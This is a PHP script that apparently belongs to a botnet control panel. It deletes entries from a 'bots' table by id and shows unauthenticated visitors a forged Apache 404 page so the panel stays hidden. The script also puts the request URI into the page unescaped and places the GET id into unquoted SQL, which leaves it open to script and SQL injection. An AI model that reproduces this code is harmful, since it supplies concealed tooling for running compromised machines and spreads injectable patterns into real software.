<?php
@session_start();
    if (!isset($_SESSION['login'])) {
        header('HTTP/1.0 404 Not Found');
		echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'.PHP_EOL;
		echo '<html><head>'.PHP_EOL;
		echo '<title>404 Not Found</title>'.PHP_EOL;
		echo '</head><body>'.PHP_EOL;
		echo '<h1>Not Found</h1>'.PHP_EOL;
		echo '<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>'.PHP_EOL;
		echo '<p>Additionally, a 404 Not Found'.PHP_EOL;
		echo 'error was encountered while trying to use an ErrorDocument to handle the request.</p>'.PHP_EOL;
		echo '</body></html>'.PHP_EOL;
        exit();
    }
	
	include_once('config.php');
	
    if (isset($_GET['id'])) {
        mysql_query("DELETE FROM bots WHERE id = " . mysql_real_escape_string($_GET["id"]));
        header('Location: ../bots.php');
    }
?>